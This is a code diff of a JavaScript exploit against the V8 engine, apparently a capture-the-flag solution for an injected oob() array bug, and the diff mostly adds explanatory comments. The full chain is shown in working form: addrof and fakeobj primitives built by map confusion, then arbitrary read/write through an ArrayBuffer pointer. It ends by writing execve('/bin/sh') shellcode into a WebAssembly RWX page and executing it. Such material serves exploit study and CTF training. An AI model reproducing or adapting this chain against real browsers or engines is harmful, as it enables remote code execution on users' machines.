@@ -1,60 +1,62 @@
-var buf = new ArrayBuffer(8); // 8 byte array buffer
+// Useful type conversion function
+var buf = new ArrayBuffer(8); 
 var f64_buf = new Float64Array(buf);
 var u64_buf = new Uint32Array(buf);
 
-function ftoi(val) { // typeof(val) = float
+function ftoi(val) { 
     f64_buf[0] = val;
-    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
+    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); 
 }
 
-function itof(val) { // typeof(val) = BigInt
+function itof(val) { 
     u64_buf[0] = Number(val & 0xffffffffn);
     u64_buf[1] = Number(val >> 32n);
     return f64_buf[0];
 }
 
-function utoi(val){
-    return eval("0x"+val.toString(16)+"n"); 
-}
+// Creat a object array and a float array
 
-/// Construct addrof primitive
 var obj = {"A":1};
-
 var obj_arr = [obj];
 var float_arr = [1.1, 1.2, 1.3, 1.4];
 
+// shift right 4 bytes element buf to get object map
 f64_buf[0] = obj_arr.oob();
 u64_buf[1] = u64_buf[1] - 4;
 obj_arr.oob(f64_buf[0]);
+// oob to get object map
 f64_buf[0] = obj_arr.oob();
 var obj_map = u64_buf[0];
+
+// oob to get float map
 f64_buf[0] = float_arr.oob();
 var float_map = u64_buf[0];
 
-console.log("Obj_map "+obj_map.toString(16));
-console.log("Float_map "+float_map.toString(16));
+console.log("Obj_map 0x"+obj_map.toString(16));
+console.log("Float_map 0x"+float_map.toString(16));
 
 function addrof(in_obj) {
-
+    //save original map
     var org = obj_arr.oob();
+    
+    //modify map to float_map
     f64_buf[0] = org;
     u64_buf[0] = float_map;
-
-    // First, put the obj whose address we want to find into index 0
+   
+    //assign object to index 0	
     obj_arr[0] = in_obj;
-    
-    // Change the obj array's map to the float array's map
+
+    //change object array to float array
     obj_arr.oob(f64_buf[0]);
 
-
-    // Get the address by accessing index 0
-    let addr = obj_arr[0];
+    //leak that object address
+    let addr = obj_arr[0]; 
     
-    f64_buf[0] = addr;
-    // Set the map back
+    // set it back
     obj_arr.oob(org);
 
-    // Return the address as a Int
+    //return BigInt address
+    f64_buf[0] = addr;
     return u64_buf[0];
 }
 
@@ -62,55 +64,93 @@ function addrof(in_obj) {
 
 function fakeobj(addr) {
     
-    // First, put the address as a float into index 0 of the float array
+    //assign address to float array at index 0 
     u64_buf[0] = addr;
     float_arr[0] = f64_buf[0];
 
+
+    //save original map
     var org = float_arr.oob();
+
+    //modify map to object_map
     f64_buf[0] = org;
     u64_buf[0] = obj_map;
 
-   
-    // Change the float array's map to the obj array's map
+    //change float array to object array 
     float_arr.oob(f64_buf[0]);
 
-    // Get a "fake" object at that memory location and store it
+    // get object 
     let fake = float_arr[0];
 
-    // Set the map back
+    // set it back
     float_arr.oob(org);
 
     // Return the object
     return fake;
 }
 
+// change element buf to the address we want to leak
 function limit_read(addr){
-	var val =  0x1000000000n - 8n + utoi(addr);
+	// | elements' buf | length | => both are 4 bytes
+	// The first element is at offset 8 of the buf
+	// Calculate the val we want to set  
+	var val =  0x1000000000n - 8n + BigInt(addr);
+	
+	// identify as a pointer
 	val = val+1n;
-	var fake_obj_layout = [itof(utoi(float_map)),itof(val)].slice(0);
+
+	// create a float array layout
+	// | map | ???  | elements' buf | length | => (slice(0) make heap layout stable)
+	var fake_obj_layout = [itof(BigInt(float_map)),itof(val)].slice(0);
+	
+	// Get fake flat array's element to leak address
 	let fake_obj = fakeobj(addrof(fake_obj_layout) - 0x10);
 	return fake_obj[0];
 }
 
 function limit_write(addr,v){
-	var val =  0x1000000000n - 8n + utoi(addr);
+	// | elements' buf | length | => both are 4 bytes
+	// The first element is at offset 8 of the buf
+	// Calculate the val we want to set  
+	var val =  0x1000000000n - 8n + BigInt(addr);
+	
+	// identify as a pointer
 	val = val+1n;
-	var fake_obj_layout = [itof(utoi(float_map)),itof(val)].slice(0);
+
+	// create a float array layout
+	// | map | ???  | elements' buf | length | => (slice(0) make heap layout stable)
+	var fake_obj_layout = [itof(BigInt(float_map)),itof(val)].slice(0);
+	
+	// Get fake flat array's element and set value back
 	let fake_obj = fakeobj(addrof(fake_obj_layout) - 0x10);
 	fake_obj[0] = v;
 }
 
-var AB_buf = new ArrayBuffer(8); // 8 byte array buffer
-var AB_u64_buf = new Float64Array(AB_buf);
-var heap_buf_offset = addrof(AB_u64_buf)+0x28-1;
+// Creat another ArrayBuffer in order to get arbitrary read/write
+var AB_buf = new ArrayBuffer(8); 
+
+// Read/Write by float 
+var AB_f64_buf = new Float64Array(AB_buf);
+
+// Get the address AB_buf's heap stored
+// Subtract one because it is a pointer
+var heap_buf_offset = addrof(AB_f64_buf)+0x28-1;
+
 
 function ab_read(addr){
+	// set heap buf to addr
 	limit_write(heap_buf_offset,addr);
-	return AB_u64_buf[0];
+
+	// read that addr
+	return AB_f64_buf[0];
 }
 function ab_write(addr,val){
+
+	// set heap buf to addr
 	limit_write(heap_buf_offset,addr);
-	AB_u64_buf[0]=val;
+	
+	// write val to addr
+	AB_f64_buf[0]=val;
 }
 
 
@@ -119,12 +159,11 @@ var wasm_mod = new WebAssembly.Module(wasm_code);
 var wasm_instance = new WebAssembly.Instance(wasm_mod);
 var f = wasm_instance.exports.main;
 
+// Get rwx page address
 var rwx = limit_read(addrof(wasm_instance)+0x68-1);
-console.log("0x"+ftoi(rwx).toString(16));
 
-
-
-shellcode = [
+// execve("/bin/sh",0,0) shellcode
+var shellcode = [
 	0x6e69622fb848686an,
 	0xe7894850732f2f2fn,
 	0x2434810101697268n,
@@ -134,9 +173,12 @@ shellcode = [
 	0xccccccccccccccccn,
 ]
 
+// Write shellcode to the rwx page
 for(let i=0;i<shellcode.length;i++){
 	ab_write(rwx,itof(shellcode[i]));
 	rwx = itof(ftoi(rwx)+8n);
 }
+
+// execute shellcode
 f();
 
